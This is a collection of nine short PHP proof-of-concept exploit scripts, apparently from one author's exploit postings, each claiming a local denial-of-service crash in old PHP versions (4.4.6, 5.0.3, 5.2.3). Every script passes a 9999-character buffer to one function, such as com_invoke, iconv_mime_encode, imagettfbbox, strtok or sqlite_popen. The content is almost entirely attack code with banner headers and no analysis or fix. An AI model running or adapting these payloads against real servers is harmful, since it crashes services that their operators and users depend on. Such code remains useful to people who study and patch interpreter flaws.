com_invoke()
<?php
// ==================================================================================
//
// PHP 4.4.6 com_invoke() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 4.4.6. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================

$buffer = str_repeat("A", 9999);
com_invoke($buffer, 1);
?>

com_propput()
<?php
// ==================================================================================
//
// PHP 4.4.6 com_propput() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 4.4.6. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================

$buffer = str_repeat("A", 9999);
com_propput(1, 1, $buffer);
?>

com_propset()
<?php
// ==================================================================================
//
// PHP 4.4.6 com_propset() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 4.4.6. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================

$buffer = str_repeat("A", 9999);
com_propset(1, 1, $buffer);
?>

iconv_mime_encode()
<?php
// ==================================================================================
//
// PHP 5.0.3 iconv_mime_encode() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 5.0.3. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================
$buff = str_repeat("A", 9999);
iconv_mime_encode($buff, 1);
?>

imageftbbox()
<?php
// ==================================================================================
//
// PHP 5.0.3 imageftbbox() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 5.0.3. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================
$buff = str_repeat("A", 9999);
imageftbbox(1, 1, $buff, 1);
?>

com_set()
<?php
// ==================================================================================
//
// PHP 4.4.6 com_set() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 4.4.6. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================

$buffer = str_repeat("A", 9999);
com_set(1, 1, $buffer);
?>

strtok()
<?php
// ==================================================================================
//
// PHP 5.2.3 strtok() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 5.2.3. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================
$buff = str_repeat("A", 9999);
strtok($buff);
?>

sqlite_popen()
<?php
// ==================================================================================
//
// PHP 5.0.3 sqlite_popen() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 5.0.3. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================
$buff = str_repeat("A", 9999);
sqlite_popen($buff);
?>

imagettfbbox()
<?php
// ==================================================================================
//
// PHP 5.0.3 imagettfbbox() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 5.0.3. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================
$buff = str_repeat("A", 9999);
imagettfbbox(1, 1, $buff, 1);
?>

